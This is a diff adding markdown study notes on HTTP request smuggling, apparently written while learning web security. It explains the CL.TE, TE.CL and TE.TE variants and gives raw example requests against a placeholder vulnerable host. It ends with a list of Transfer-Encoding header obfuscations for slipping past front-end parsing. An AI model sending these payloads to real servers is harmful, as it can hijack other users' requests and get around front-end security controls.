@@ -1,0 +1,66 @@
+#HTTP request smuggling - writing one request so that the server thinks that it is 2 different.
+It uses 2 headers. `Content-Length: x` and `Transfer-Encoding: chunked`. **It works only in HTTTP/1.1**.
+
+
+##CL.TE
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+Front-end server support only Content-Length header, backend support Transfer-Encoding. Front pass all as 1 request, backend split into two and read second one as new request, which start from
+word SMUGGLED, as method. And next request passed to server will be added to this, and will arise error.
+
+##TE.CL
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+````
+Front-end server support Transfer-Encoding header, backend support only Content-Length. Front pass all as 1 request, backend split into two and read second one as new request, which start from
+word SMUGGLED, as method. And next request passed to server will be added to this, and will arise error.
+
+##TE.TE
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 8
+Transfer-Encoding: cow
+Transfer-Encoding: chunked
+
+0
+
+
+G
+```
+Front-end server support Transfer-Encoding, but can be bypassed, to be readed backend server.
+Bypass methods:
+```
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+```
